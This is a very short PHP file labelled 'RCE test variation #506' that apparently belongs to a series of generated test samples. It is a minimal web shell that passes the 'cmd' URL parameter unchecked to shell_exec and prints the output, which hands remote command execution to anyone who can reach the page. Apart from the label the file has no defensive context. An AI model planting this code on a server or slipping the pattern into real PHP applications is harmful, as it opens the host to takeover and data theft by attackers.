<?php
// RCE test variation #506
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>